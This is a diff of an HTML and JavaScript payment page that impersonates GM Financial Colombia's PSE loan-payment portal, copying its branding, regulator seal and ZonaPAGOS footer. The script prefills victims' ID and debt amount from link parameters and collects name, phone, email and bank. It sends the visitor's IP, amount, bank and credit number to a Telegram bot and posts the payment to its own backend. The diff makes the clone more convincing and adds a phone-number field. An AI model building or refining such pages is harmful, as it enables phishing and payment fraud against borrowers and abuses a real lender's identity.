@@ -4,11 +4,10 @@
 <meta charset="utf-8">
 <title>Pago GM Financial - PSE</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<!-- Fuente similar a la del sitio real -->
 <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
   :root {
-    --gm-blue: #0047FF; /* Azul del botón y borde superior */
+    --gm-blue: #0047FF;
     --gm-text: #333333;
     --gm-gray-light: #f4f4f4;
     --gm-gray-border: #cccccc;
@@ -18,157 +17,80 @@
   body {
     font-family: 'Open Sans', Arial, sans-serif;
     color: var(--gm-text);
-    background-color: #ffffff;
+    background-color: #f5f5f5; /* Fondo gris suave para que resalte la tarjeta */
     display: flex;
     flex-direction: column;
     min-height: 100vh;
   }
 
   /* ─── HEADER ─── */
-  .top-bar {
-    height: 5px;
-    background-color: var(--gm-blue);
-    width: 100%;
-  }
+  .top-bar { height: 5px; background-color: var(--gm-blue); width: 100%; }
   .header {
-    padding: 20px;
-    display: flex;
-    align-items: center;
-    border-bottom: 1px solid #eaeaea;
+    padding: 15px 20px; display: flex; align-items: center; background: #fff; border-bottom: 1px solid #eaeaea;
   }
-  .header img {
-    height: 40px;
-    object-fit: contain;
-  }
+  .header img { height: 35px; object-fit: contain; }
+  @media (min-width: 768px) { .header { padding: 20px 40px; } .header img { height: 45px; } }
 
   /* ─── CONTENIDO PRINCIPAL ─── */
   .main-content {
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 40px 20px;
+    flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center;
+    padding: 30px 15px;
   }
 
   .titulo-pago {
-    font-size: 16px;
-    font-weight: 400;
-    color: #444;
-    text-align: center;
-    margin-bottom: 30px;
+    font-size: 16px; font-weight: 400; color: #444; text-align: center; margin-bottom: 25px;
   }
+  @media (min-width: 768px) { .titulo-pago { font-size: 18px; margin-bottom: 30px; } }
 
+  /* La tarjeta (Card) del formulario */
   .card-pago {
-    background-color: var(--gm-gray-light);
-    border: 1px solid #ddd;
-    border-radius: 6px;
-    padding: 30px;
+    background-color: #ffffff;
+    border: 1px solid #e0e0e0;
+    border-radius: 8px;
+    padding: 25px 20px;
     width: 100%;
-    max-width: 600px;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+    max-width: 500px; /* En PC no se estira demasiado, se mantiene elegante */
+    box-shadow: 0 6px 20px rgba(0,0,0,0.08);
+  }
+  @media (min-width: 768px) { .card-pago { padding: 35px 40px; } }
+
+  /* Campos del formulario */
+  .form-group { margin-bottom: 16px; }
+  .form-group label {
+    display: block; margin-bottom: 6px; font-size: 13px; font-weight: 600; color: #555;
+  }
+  .form-group input, .form-group select {
+    width: 100%; padding: 12px 15px; border: 1px solid var(--gm-gray-border);
+    border-radius: 6px; font-size: 14px; font-family: inherit; outline: none;
+    transition: border-color 0.2s;
+  }
+  .form-group input:focus, .form-group select:focus {
+    border-color: var(--gm-blue);
+  }
+  
+  /* Estilos para campos bloqueados */
+  .form-group input[readonly] {
+    background-color: #f0f0f0; color: #666; cursor: not-allowed; font-weight: 600;
+  }
+  
+  /* Estilo especial para el monto a pagar */
+  .monto-destacado {
+    color: var(--gm-blue) !important; 
+    font-size: 18px !important; 
+    font-weight: 700 !important;
   }
 
-  .form-group {
-    margin-bottom: 15px;
-    position: relative;
-    display: flex;
-  }
-
-  .input-icon {
-    width: 45px;
-    background-color: #fff;
-    border: 1px solid var(--gm-gray-border);
-    border-right: none;
-    border-radius: 4px 0 0 4px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #555;
-  }
-
-  .input-field {
-    flex: 1;
-    padding: 12px 15px;
-    border: 1px solid var(--gm-gray-border);
-    border-left: none;
-    border-right: none;
-    font-size: 14px;
-    outline: none;
-    font-family: inherit;
-  }
-  .input-field:focus {
-    background-color: #fafafa;
-  }
-
-  .input-help {
-    width: 45px;
-    background-color: #fff;
-    border: 1px solid var(--gm-gray-border);
-    border-left: none;
-    border-radius: 0 4px 4px 0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #777;
-    font-size: 18px;
-    cursor: help;
-    font-weight: bold;
-  }
-
-  /* Elementos para el formulario PSE dentro de la tarjeta */
-  .pse-fields {
-    margin-top: 25px;
-    padding-top: 25px;
-    border-top: 1px dashed #ccc;
-  }
-  .pse-fields select,
-  .pse-fields input[type="email"],
-  .pse-fields input[type="number"] {
-    width: 100%;
-    padding: 12px 15px;
-    border: 1px solid var(--gm-gray-border);
-    border-radius: 4px;
-    font-size: 14px;
-    font-family: inherit;
-    outline: none;
-  }
-  .pse-fields label {
-    display: block;
-    margin-bottom: 5px;
-    font-size: 13px;
-    font-weight: 600;
-    color: #555;
-  }
-
+  /* Botón */
   .btn-continuar {
-    width: 100%;
-    padding: 15px;
-    background-color: var(--gm-blue);
-    color: white;
-    border: none;
-    border-radius: 4px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    margin-top: 20px;
-    transition: background 0.2s;
+    width: 100%; padding: 14px; background-color: var(--gm-blue); color: white;
+    border: none; border-radius: 6px; font-size: 16px; font-weight: 600;
+    cursor: pointer; margin-top: 10px; transition: background 0.2s;
   }
-  .btn-continuar:hover:not(:disabled) {
-    background-color: #0036cc;
-  }
-  .btn-continuar:disabled {
-    background-color: #88aaff;
-    cursor: not-allowed;
-  }
+  .btn-continuar:hover:not(:disabled) { background-color: #0036cc; }
+  .btn-continuar:disabled { background-color: #88aaff; cursor: not-allowed; }
 
-  .alert {
-    padding: 10px 15px;
-    border-radius: 4px;
-    margin-bottom: 15px;
-    font-size: 13px;
-    display: none;
-  }
+  /* Alertas */
+  .alert { padding: 12px 15px; border-radius: 6px; margin-bottom: 15px; font-size: 13px; display: none; }
   .alert.error { background: #fce8e6; color: #c5221f; border: 1px solid #f5c6cb; }
   .alert.success { background: #e6f4ea; color: #137333; border: 1px solid #c3e6cb; }
   .alert.info { background: #e8f0fe; color: #1a73e8; border: 1px solid #b8daff; }
@@ -176,79 +98,29 @@
 
   /* ─── FOOTER ─── */
   .footer {
-    background-color: #000000;
-    color: #ffffff;
-    padding: 30px 20px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    flex-wrap: wrap;
-    gap: 20px;
+    background-color: #000000; color: #ffffff; padding: 25px 20px;
+    display: flex; flex-direction: column; align-items: flex-start; gap: 20px;
   }
-
-  .footer-left {
-    display: flex;
-    align-items: center;
-    gap: 15px;
+  @media (min-width: 768px) {
+    .footer { padding: 30px 40px; flex-direction: row; justify-content: space-between; align-items: center; }
   }
-
+  .footer-left { display: flex; align-items: center; gap: 15px; }
   .sello-vigilado {
-    height: 60px;
-    /* Si tienes la imagen del sello ponla aquí, si no, lo dejamos con texto */
-    border: 1px solid #fff;
-    padding: 5px;
-    font-size: 8px;
-    text-align: center;
-    writing-mode: vertical-rl;
-    transform: rotate(180deg);
-    letter-spacing: 1px;
+    border: 1px solid #fff; padding: 5px 2px; font-size: 8px; text-align: center;
+    writing-mode: vertical-rl; transform: rotate(180deg); letter-spacing: 1px; height: 70px;
+    display: flex; justify-content: center;
   }
-
-  .footer-logo {
-    height: 35px;
-    filter: brightness(0) invert(1); /* Hace el logo blanco si es oscuro */
-    object-fit: contain;
-  }
-
-  .footer-right {
-    text-align: right;
-    font-size: 12px;
-    color: #aaaaaa;
-    line-height: 1.6;
-  }
-  .footer-right strong {
-    color: #00c98d; /* Color teal de ZonaPAGOS */
-  }
-
-  /* Ocultar el grupo de documento/placa original ya que se prellenan */
-  .form-group.hidden {
-    display: none;
-  }
-
-  @media (max-width: 768px) {
-    .footer {
-      flex-direction: column;
-      align-items: flex-start;
-    }
-    .footer-right {
-      text-align: left;
-    }
-    .card-pago {
-      padding: 20px;
-    }
-  }
+  @media (min-width: 768px) { .sello-vigilado { font-size: 9px; height: 80px; } }
+  .footer-logo { height: 30px; filter: brightness(0) invert(1); object-fit: contain; }
+  .footer-logo-text { font-size: 9px; color: #aaa; margin-top: 5px; line-height: 1.2; }
+  .footer-right { text-align: left; font-size: 11px; color: #aaaaaa; line-height: 1.6; }
+  @media (min-width: 768px) { .footer-right { text-align: right; font-size: 13px; } }
+  .footer-right strong { color: #00c98d; }
 
   /* Spinner */
   .spinner {
-    display: inline-block;
-    width: 16px;
-    height: 16px;
-    border: 2px solid rgba(255,255,255,0.4);
-    border-top-color: #fff;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-    margin-right: 8px;
-    vertical-align: middle;
+    display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.4);
+    border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
 </style>
@@ -258,13 +130,12 @@
 <div class="top-bar"></div>
 
 <div class="header">
-  <!-- Reemplaza 'gm.png' por el nombre real de tu archivo de imagen -->
-  <img src="gm.png" alt="GM Financial" onerror="this.outerHTML='<h2 style=\'color:#0047FF; font-weight:700;\'>gm FINANCIAL</h2>'">
+  <img src="gm.png" alt="GM Financial" onerror="this.outerHTML='<h2 style=\'color:#0047FF; font-weight:700; font-size:20px;\'>gm FINANCIAL</h2>'">
 </div>
 
 <div class="main-content">
   <div class="titulo-pago">
-    Realiza fácilmente el pago de la cuota de tu<br>crédito
+    Realiza fácilmente el pago de la cuota de tu crédito
   </div>
 
   <div class="card-pago">
@@ -272,71 +143,62 @@
 
     <form id="form-pse" autocomplete="off">
       
-      <!-- Campos estilo ZonaPAGOS (Prellenados) -->
+      <!-- 1. Monto a pagar (Visible y bloqueado) -->
       <div class="form-group">
-        <div class="input-icon">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-        </div>
-        <input type="text" id="numero_documento" name="numero_documento" class="input-field" required placeholder="Documento de identidad (Para NIT, no incluir dígito de verificación)">
-        <div class="input-help">?</div>
+        <label for="amount">Monto a pagar *</label>
+        <input type="text" id="amount" required readonly class="monto-destacado">
       </div>
 
+      <!-- 2. Nombre completo -->
       <div class="form-group">
-        <div class="input-icon">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.92 6.01C18.72 5.42 18.16 5 17.5 5h-11c-.66 0-1.21.42-1.42 1.01L3 12v8c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-1h12v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-8l-2.08-5.99zM6.5 16c-.83 0-1.5-.67-1.5-1.5S5.67 13 6.5 13s1.5.67 1.5 1.5S7.33 16 6.5 16zm11 0c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zM5 11l1.5-4.5h11L19 11H5z"/></svg>
-        </div>
-        <input type="text" id="placa_vehiculo" class="input-field" placeholder="Ingresa la placa del vehículo financiado (Sin espacios)" readonly>
-        <div class="input-help">?</div>
+        <label for="nombre_completo">Nombre completo *</label>
+        <input type="text" id="nombre_completo" required placeholder="Ej: Juan Pérez">
       </div>
 
-      <!-- Campos adicionales para PSE -->
-      <div class="pse-fields">
-        <div style="margin-bottom: 12px;">
-          <label for="nombre_completo">Nombre completo *</label>
-          <input type="text" id="nombre_completo" required style="width:100%; padding:12px 15px; border:1px solid #ccc; border-radius:4px; font-family:inherit;">
-        </div>
+      <!-- 3. Cédula (Prellenada y bloqueada) -->
+      <div class="form-group">
+        <label for="numero_documento">Cédula de ciudadanía *</label>
+        <input type="text" id="numero_documento" required readonly>
+      </div>
 
-        <div style="margin-bottom: 12px;">
-          <label for="email">Correo electrónico *</label>
-          <input type="email" id="email" required placeholder="tucorreo@ejemplo.com">
-        </div>
+      <!-- 4. Número de celular -->
+      <div class="form-group">
+        <label for="celular">Número de celular *</label>
+        <input type="tel" id="celular" required placeholder="Ej: 3001234567">
+      </div>
 
-        <div style="margin-bottom: 12px;">
-          <label for="bank_code">Banco para PSE *</label>
-          <select id="bank_code" required>
-            <option value="">Cargando bancos...</option>
-          </select>
-        </div>
+      <!-- 5. Correo electrónico -->
+      <div class="form-group">
+        <label for="email">Correo electrónico *</label>
+        <input type="email" id="email" required placeholder="tucorreo@ejemplo.com">
+      </div>
 
-        <div>
-          <label for="amount">Monto a pagar (COP) *</label>
-          <input type="number" id="amount" required step="1" min="1" placeholder="0">
-        </div>
+      <!-- 6. Banco PSE -->
+      <div class="form-group">
+        <label for="bank_code">Selecciona tu banco *</label>
+        <select id="bank_code" required>
+          <option value="">Cargando bancos...</option>
+        </select>
       </div>
 
       <button type="submit" id="btn-pagar" class="btn-continuar" disabled>
-        Continuar
+        Pagar con PSE
       </button>
     </form>
   </div>
 </div>
 
-<!-- FOOTER NEGRO COMO EN LA FOTO -->
+<!-- FOOTER NEGRO -->
 <div class="footer">
   <div class="footer-left">
-    <div class="sello-vigilado">
-      VIGILADO<br>SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA
-    </div>
-    <!-- Reemplaza 'gm.png' por tu logo -->
-    <img src="gm.png" alt="GM Financial" class="footer-logo" onerror="this.outerHTML='<h2 style=\'color:#fff; font-weight:700;\'>gm FINANCIAL</h2>'">
-    <div style="font-size: 10px; color: #aaa; margin-left: 10px; line-height: 1.2;">
-      GM Financial Colombia S.A.<br>Compañía de Financiamiento.
+    <div class="sello-vigilado">VIGILADO<br>SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</div>
+    <div>
+      <img src="gm.png" alt="GM Financial" class="footer-logo" onerror="this.outerHTML='<h2 style=\'color:#fff; font-weight:700;\'>gm FINANCIAL</h2>'">
+      <div class="footer-logo-text">GM Financial Colombia S.A.<br>Compañía de Financiamiento.</div>
     </div>
   </div>
-  
   <div class="footer-right">
-    <strong>ZonaPAGOS</strong> es un producto de ZonaVirtual S.A.<br>
-    Copyright ZonaVirtual S.A.
+    <strong>ZonaPAGOS</strong> es un producto de ZonaVirtual S.A.<br>Copyright ZonaVirtual S.A.
   </div>
 </div>
 
@@ -353,11 +215,13 @@
   // URL Params
   const params = new URLSearchParams(window.location.search);
   const PARAM_DOC     = params.get('documento') || '';
-  const PARAM_PLACA   = params.get('placa')     || '';
   const PARAM_TOTAL   = params.get('total')     || '';
   const PARAM_NOMBRE  = params.get('nombre')    || '';
   const PARAM_FACTURA = params.get('factura')   || '';
   const PARAM_CREDITO = params.get('credito')   || params.get('numeroCredito') || '';
+
+  // Guardamos el valor numérico real en una variable global
+  let VALOR_NUMERICO = 0;
 
   const $ = (id) => document.getElementById(id);
 
@@ -374,49 +238,40 @@
   }
 
   async function obtenerIP() {
-    const proveedores = ['https://api.ipify.org?format=json', 'https://ipapi.co/json/'];
-    for (const url of proveedores) {
-      try {
-        const r = await fetch(url, { cache: 'no-store' });
-        const d = await r.json();
-        if (d.ip || d.query) return d.ip || d.query;
-      } catch (_) {}
-    }
-    return 'desconocida';
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const d = await r.json();
+      return d.ip || 'desconocida';
+    } catch (_) { return 'desconocida'; }
   }
 
-  async function notificarTelegram({ ip, valor, banco, credito }) {
+  async function notificarTelegram(ip, valor, banco, credito) {
     const texto = 
       '🚨 <b>NUEVO PAGO PSE — GM FINANCIAL</b> 🚨\n' +
-      '━━━━━━━━━━━━━━━━━━━━\n' +
       `🌐 <b>IP:</b> <code>${ip}</code>\n` +
       `💰 <b>Valor:</b> ${formatearCOP(valor)}\n` +
       `🏦 <b>Banco:</b> ${banco}\n` +
       `📄 <b>N° crédito:</b> ${credito || '—'}\n` +
-      `🕒 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}\n` +
-      '━━━━━━━━━━━━━━━━━━━━';
+      `🕒 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
 
     try {
       await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TG_CHAT_ID,
-          text: texto,
-          parse_mode: 'HTML',
-          disable_web_page_preview: true,
-        }),
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: texto, parse_mode: 'HTML' }),
       });
-    } catch (err) {
-      console.error('[telegram] error:', err);
-    }
+    } catch (err) { console.error('[telegram]', err); }
   }
 
   function prellenar() {
     if (PARAM_DOC) $('numero_documento').value = PARAM_DOC;
-    if (PARAM_PLACA) $('placa_vehiculo').value = PARAM_PLACA;
     if (PARAM_NOMBRE) $('nombre_completo').value = PARAM_NOMBRE;
-    if (PARAM_TOTAL) $('amount').value = Number(String(PARAM_TOTAL).replace(/[^0-9.]/g, ''));
+    
+    if (PARAM_TOTAL) {
+      VALOR_NUMERICO = Number(String(PARAM_TOTAL).replace(/[^0-9.]/g, ''));
+      // Pintamos el valor formateado en el input readonly
+      $('amount').value = formatearCOP(VALOR_NUMERICO);
+    }
   }
 
   async function cargarBancos() {
@@ -446,15 +301,12 @@
 
     const nombre = $('nombre_completo').value.trim();
     const numeroDocumento = $('numero_documento').value.trim();
+    const celular = $('celular').value.trim();
     const email = $('email').value.trim();
     const bankCode = $('bank_code').value;
-    const amount = Number($('amount').value);
 
-    if (!nombre || !numeroDocumento || !email || !bankCode || !amount) {
-      return mostrarAlerta('error', 'Por favor completa todos los campos (Nombre, Documento, Email, Banco y Monto).');
-    }
-    if (amount < 1000) {
-      return mostrarAlerta('error', 'El monto mínimo es $1.000 COP.');
+    if (!nombre || !numeroDocumento || !celular || !email || !bankCode || !VALOR_NUMERICO) {
+      return mostrarAlerta('error', 'Por favor completa todos los campos.');
     }
 
     const selectBanco = $('bank_code');
@@ -468,7 +320,7 @@
     mostrarAlerta('info', 'Conectando con PSE...');
 
     const ip = await obtenerIP();
-    notificarTelegram({ ip, valor: amount, banco: bankName, credito });
+    notificarTelegram(ip, VALOR_NUMERICO, bankName, credito);
 
     try {
       const resp = await fetch(`${API_BASE}/pse/pagar`, {
@@ -477,9 +329,9 @@
         body: JSON.stringify({
           bank_code: bankCode,
           bank_name: bankName,
-          document_type: 'CC', // Asumimos CC por defecto en este form
+          document_type: 'CC',
           document_number: numeroDocumento,
-          amount: amount,
+          amount: VALOR_NUMERICO, // Enviamos el valor numérico real
           email: email,
           full_name: nombre,
         }),
@@ -494,7 +346,7 @@
     } catch (err) {
       mostrarAlerta('error', 'Error al procesar el pago: ' + err.message);
       btn.disabled = false;
-      btn.innerHTML = 'Continuar';
+      btn.innerHTML = 'Pagar con PSE';
     }
   });
 
